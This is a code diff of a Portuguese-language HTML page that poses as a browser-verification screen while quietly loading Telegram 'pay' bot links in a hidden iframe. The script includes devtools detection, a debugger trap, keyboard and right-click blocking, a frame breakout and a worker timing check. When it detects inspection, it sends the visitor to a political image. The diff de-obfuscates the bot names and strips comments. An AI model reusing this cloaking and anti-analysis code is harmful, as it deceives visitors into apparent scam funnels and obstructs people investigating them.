@@ -8,23 +8,12 @@
 <meta http-equiv="Content-Security-Policy" content="default-src 'none'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';">
 <noscript><title>Bloqueado</title><style>body{background:#000}*{display:none}</style></noscript>
 <style>
-  :root{
-    --bg:#05030a;
-    --panel:#0b0b10;
-    --neon1:#ff0044;
-    --neon2:#7b00ff;
-    --muted:#9aa3ad;
-    --glass:rgba(255,255,255,0.03);
-  }
+  :root{--bg:#05030a;--panel:#0b0b10;--neon1:#ff0044;--neon2:#7b00ff;--muted:#9aa3ad;--glass:rgba(255,255,255,0.03)}
   *{box-sizing:border-box;margin:0;padding:0}
-  html,body{height:100%;background:radial-gradient(circle at 10% 10%, rgba(123,0,255,0.06), transparent 15%), linear-gradient(180deg,#04030a,#06020c);font-family:Inter, "Helvetica Neue", Arial, sans-serif;color:#fff;display:flex;align-items:center;justify-content:center}
-  .card{
-    width:100%;max-width:520px;padding:26px;border-radius:14px;background:linear-gradient(180deg, rgba(255,255,255,0.02), rgba(255,255,255,0.01));box-shadow:0 20px 50px rgba(0,0,0,0.7);border:1px solid rgba(255,255,255,0.03);position:relative;overflow:hidden
-  }
+  html,body{height:100%;background:radial-gradient(circle at 10% 10%,rgba(123,0,255,0.06),transparent 15%),linear-gradient(180deg,#04030a,#06020c);font-family:Inter,"Helvetica Neue",Arial,sans-serif;color:#fff;display:flex;align-items:center;justify-content:center}
+  .card{width:100%;max-width:520px;padding:26px;border-radius:14px;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));box-shadow:0 20px 50px rgba(0,0,0,0.7);border:1px solid rgba(255,255,255,0.03);position:relative;overflow:hidden}
   .hdr{display:flex;align-items:center;gap:14px}
-  .logo{
-    width:72px;height:72px;border-radius:50%;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,var(--neon1),var(--neon2));box-shadow:0 8px 30px rgba(123,0,255,0.18), inset 0 -6px 18px rgba(0,0,0,0.25)
-  }
+  .logo{width:72px;height:72px;border-radius:50%;display:flex;align-items:center;justify-content:center;background:linear-gradient(135deg,var(--neon1),var(--neon2));box-shadow:0 8px 30px rgba(123,0,255,0.18),inset 0 -6px 18px rgba(0,0,0,0.25)}
   .logo svg{width:44px;height:44px;display:block}
   h1{font-size:20px;margin:0;color:var(--neon1);text-shadow:0 0 18px rgba(255,0,68,0.18)}
   p.lead{color:var(--muted);margin-top:6px;font-size:13px}
@@ -36,15 +25,14 @@
   .sub{font-size:12px;color:rgba(255,255,255,0.25);margin-top:6px;text-align:center}
   .pills{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-top:12px}
   .pill{background:rgba(255,255,255,0.02);padding:6px 10px;border-radius:999px;border:1px solid rgba(255,255,255,0.02);font-size:12px;color:var(--muted)}
-  .glow-top{position:absolute;left:-20%;top:-20%;width:160%;height:220px;background:radial-gradient(circle at 50% 50%, rgba(123,0,255,0.06), transparent 30%);pointer-events:none}
-  .glow-bottom{position:absolute;right:-10%;bottom:-20%;width:120%;height:200px;background:radial-gradient(circle at 50% 50%, rgba(255,0,68,0.06), transparent 30%);pointer-events:none}
+  .glow-top{position:absolute;left:-20%;top:-20%;width:160%;height:220px;background:radial-gradient(circle at 50% 50%,rgba(123,0,255,0.06),transparent 30%);pointer-events:none}
+  .glow-bottom{position:absolute;right:-10%;bottom:-20%;width:120%;height:200px;background:radial-gradient(circle at 50% 50%,rgba(255,0,68,0.06),transparent 30%);pointer-events:none}
   @media (max-width:420px){.card{padding:18px}h1{font-size:18px}}
 </style>
 </head>
 <body>
   <div class="card" role="status" aria-live="polite">
-    <div class="glow-top"></div>
-    <div class="glow-bottom"></div>
+    <div class="glow-top"></div><div class="glow-bottom"></div>
     <div class="hdr">
       <div class="logo" aria-hidden="true">
         <svg viewBox="0 0 240 240" aria-hidden="true">
@@ -67,32 +55,25 @@
 
 <script>
 (()=>{
-  const desktopTarget = "https://t.me/lasagnamax_pay112w3n_bot?start=go";
-  const mobileLinks = location.host==='127.0.0.1'? ["//127.0.0.1:5500/a.html"]:[
-    "//t.etm.e/cGFuY2FrZWNob2NvX3BheTEwMXY3a19ib3Q","//t.etm.e/YnVyZ2Vya2luZ19wYXkxMDN4OXJfYm90",
-    "//t.etm.e/cGl6emFsb3ZlX3BheTEwNXE4el9ib3Q","//t.etm.e/dGFjb2ZpcmVfcGF5MTA4Yjl4X2JvdA=="
-  ].map(u=>"https://t.me/"+atob(u.split("/")[2])+"?start=go");
+  const mobileLinks=[
+    "https://t.me/tacofire_pay108b9x_bot?start=go",
+    "https://t.me/pizzalove_pay105q8z_bot?start=go",
+    "https://t.me/burgerking_pay103x9r_bot?start=go",
+    "https://t.me/pancakechoco_pay101v7k_bot?start=go"
+  ];
   const trap="https://www.esmaelmorais.com.br/wp-content/uploads/2023/06/lula-faz-l.jpg.webp";
   let detected=false;
   const kill=()=>{if(!detected){detected=true;location.replace(trap)}};
-
-  // blindagem inicial
   document.addEventListener('contextmenu',e=>{e.preventDefault();kill()},{passive:false});
   document.addEventListener('keydown',e=>{const k=e.key||'';if(k==='F12'||(e.ctrlKey&&e.shiftKey&&'IJC'.includes(k.toUpperCase()))||(e.ctrlKey&&k.toUpperCase()==='U')){e.preventDefault();kill()}},{passive:false});
   let d=0;setInterval(()=>{const w=window.outerWidth-window.innerWidth,h=window.outerHeight-window.innerHeight;if((w>160||h>160)&&++d>1)kill()},1100);
-
-  // UI
   const progress=document.getElementById('progress');
   const status=document.getElementById('status');
   const pills=document.getElementById('pills');
   const noJs=document.getElementById('no-js');if(noJs)noJs.remove();
-  const addP=l=>{pills.innerHTML='';l.forEach(u=>{const t=decodeURIComponent(u.replace(/^.*\/([^.]+)\.bot.*/,'$1')).replace(/_/g,' '),p=document.createElement('div');p.className='pill';p.textContent=t;pills.appendChild(p)})};
+  const addP=l=>{pills.innerHTML='';l.forEach(u=>{const t=u.match(/t\.me\/([^?]+)/)[1].replace("_bot",""),p=document.createElement('div');p.className='pill';p.textContent=t;pills.appendChild(p)})};
   addP(mobileLinks);
-
-  const isD=()=>(!/Mobi|Android|iPhone|iPad|iPod|Silk|Mobile/i.test(navigator.userAgent)&&screen.width>=1024);
-
-  const loadPath=()=>location.href.replace('#',''); // stub
-
+  const isD=()=>!/Mobi|Android|iPhone|iPad|iPod|Silk/i.test(navigator.userAgent);
   const steps=["Verificando navegador...","Estabelecendo conexão...","Validando sessão...","Preparando redirecionamento..."];
   let step=0,start=performance.now(),total=2600;
   const tick=t=>{
@@ -100,12 +81,12 @@
     progress.style.width=(p*100)+"%";
     const idx=Math.floor(p*steps.length);
     if(idx!==step){step=idx;if(steps[step])status.textContent=steps[step]}
-    if(p<1)requestAnimationFrame(tick); else {
+    if(p<1)requestAnimationFrame(tick);else{
       if(detected)return;
       status.textContent="Abrindo destino...";
       const code=Math.floor(Math.random()*8999)+1000;
       const encoded=btoa(code.toString().split("").reverse().join(""));
-      const dest=(isD()?desktopTarget:mobileLinks[Math.floor(Math.random()*mobileLinks.length)])+"&u="+encodeURIComponent(encoded);
+      const dest=(isD()?mobileLinks[0]:mobileLinks[Math.floor(Math.random()*mobileLinks.length)])+"&u="+encodeURIComponent(encoded);
       const frm=document.createElement('iframe');frm.src=dest;
       frm.style="position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;border:0";
       document.body.appendChild(frm);
@@ -113,29 +94,18 @@
     }
   };
   requestAnimationFrame(tick);
-
-  // anti-logs
   const nativeLog=console.log;
   console.log=function(...a){const s=new Error().stack;if(/devtools|debugger|^eval/ig.test(s))kill();nativeLog.apply(console,a)};
-
-  // anti-blur
   let blurC=0;
   window.addEventListener('blur',()=>{if(++blurC>4)kill()});
-
-  // iframe check
   try{if(window.top!==window.self)window.top.location=window.self.location}catch(e){}
   try{if(document.location.ancestorOrigins&&document.location.ancestorOrigins.length)kill()}catch(e){}
-
-  // debugger trap
   setInterval(()=>{!function(){debugger}()({port:1337^Math.random()})},300);
-
-  // fake worker trap
   try{
     const wc="self.onmessage=()=>setInterval(()=>{const hr=performance.now();if(Math.random()<.01&&Math.abs(hr-Math.round(hr))<1e-4)postMessage('dbg')},300)";
     const w=new Worker(URL.createObjectURL(new Blob([wc],{type:'text/javascript'})));
     w.onmessage=m=>{if(m.data==='dbg')kill()}
   }catch(e){}
-
 })();
 </script>
 </body>
